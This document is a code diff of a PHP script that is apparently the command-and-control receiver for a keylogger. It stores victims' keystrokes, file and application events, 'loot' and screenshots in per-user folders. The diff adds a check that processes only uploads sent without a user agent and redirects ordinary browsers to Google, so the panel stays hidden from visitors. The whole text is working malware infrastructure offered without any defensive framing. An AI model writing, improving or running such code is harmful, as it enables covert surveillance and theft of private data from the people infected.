@@ -48,64 +48,71 @@ $username = $_GET["username"];
 $uploadtype = $_GET["type"];
 /// Today's date.
 $date = date("Y-m-d");
-/// Folder to put everything.
-$pillagefolder = "loot/";
-/// A folder dedicated for storing the unfortunate person's logged data.
-$userfolder = $pillagefolder . $date . "/" . FilterFilename($username);
-/// Check if the current date's folder exist. If not create it.
-CheckFolder($userfolder);
 
-$delimiter = "[!time: " . date("h:i:sa") . "!]" . PHP_EOL;
-/// Parse upload.
-switch($uploadtype){
-    case "logs":
-        /// Get sent logs.
-        $logs = $_REQUEST[$uploadtype];
-        $logfile = $userfolder . "/keylogs.txt";
-        $fh = fopen($logfile, 'a') or die("Can't create file");
-        fwrite($fh, $delimiter);
-        fwrite($fh, $logs);
-    break;
-    case "fileevent":
-        /// Get sent logs.
-        $logs = $_REQUEST[$uploadtype];
-        $logfile = $userfolder . "/fileevents.txt";
-        $fh = fopen($logfile, 'a') or die("Can't create file");
-        fwrite($fh, $delimiter);
-        fwrite($fh, $logs);
-    break;
-    case "applicationevent":
-        /// Get sent logs.
-        $logs = $_REQUEST[$uploadtype];
-        $logfile = $userfolder . "/applicationevents.txt";
-        $fh = fopen($logfile, 'a') or die("Can't create file");
-        fwrite($fh, $delimiter);
-        fwrite($fh, $logs);
-    break;
-    case "loot":
-        /// Get sent logs.
-        $logs = $_REQUEST[$uploadtype];
-        $logfile = $userfolder . "/loots.txt";
-        $fh = fopen($logfile, 'a') or die("Can't create file");
-        fwrite($fh, $delimiter);
-        fwrite($fh, $logs);
-    break;
-    case "screenshot":
-        $screenshotfolder = $userfolder . "/screenshots";
-        CheckFolder($screenshotfolder);
-        $screenshotfile = $screenshotfolder . "/" . date("h-i-sa") . ".jpg";
-        $filefromtemp = $_FILES["file"]["tmp_name"];
-        move_uploaded_file($filefromtemp, $screenshotfile);
+/// If UA is empty (or loot upload)
+if (empty($_SERVER['HTTP_USER_AGENT']) || $_SERVER['HTTP_USER_AGENT'] == null) {
+    /// Folder to put everything.
+    $pillagefolder = "loot/";
+    /// A folder dedicated for storing the unfortunate person's logged data.
+    $userfolder = $pillagefolder . $date . "/" . FilterFilename($username);
+    /// Check if the current date's folder exist. If not create it.
+    CheckFolder($userfolder);
+
+    $delimiter = "[!time: " . date("h:i:sa") . "!]" . PHP_EOL;
+    /// Parse upload.
+    switch($uploadtype){
+        case "logs":
+            /// Get sent logs.
+            $logs = $_REQUEST[$uploadtype];
+            $logfile = $userfolder . "/keylogs.txt";
+            $fh = fopen($logfile, 'a') or die("Can't create file");
+            fwrite($fh, $delimiter);
+            fwrite($fh, $logs);
         break;
-    case "update":
-        header("Content-Type: text/plain");
-        // show update.json
-        readfile("Update.json");
+        case "fileevent":
+            /// Get sent logs.
+            $logs = $_REQUEST[$uploadtype];
+            $logfile = $userfolder . "/fileevents.txt";
+            $fh = fopen($logfile, 'a') or die("Can't create file");
+            fwrite($fh, $delimiter);
+            fwrite($fh, $logs);
         break;
+        case "applicationevent":
+            /// Get sent logs.
+            $logs = $_REQUEST[$uploadtype];
+            $logfile = $userfolder . "/applicationevents.txt";
+            $fh = fopen($logfile, 'a') or die("Can't create file");
+            fwrite($fh, $delimiter);
+            fwrite($fh, $logs);
+        break;
+        case "loot":
+            /// Get sent logs.
+            $logs = $_REQUEST[$uploadtype];
+            $logfile = $userfolder . "/loots.txt";
+            $fh = fopen($logfile, 'a') or die("Can't create file");
+            fwrite($fh, $delimiter);
+            fwrite($fh, $logs);
+        break;
+        case "screenshot":
+            $screenshotfolder = $userfolder . "/screenshots";
+            CheckFolder($screenshotfolder);
+            $screenshotfile = $screenshotfolder . "/" . date("h-i-sa") . ".jpg";
+            $filefromtemp = $_FILES["file"]["tmp_name"];
+            move_uploaded_file($filefromtemp, $screenshotfile);
+            break;
+        case "update":
+            header("Content-Type: text/plain");
+            // show update.json
+            readfile("Update.json");
+            break;
+    }
+    header("HTTP/1.1 200 OK");
+    /// End session.
+    die();
 }
-header("HTTP/1.1 200 OK");
-/// End session.
-die();
+else { // is browser, redirect somewhere else
+    header('Location: http://www.google.com');
+}
 ?>
 
 <html>
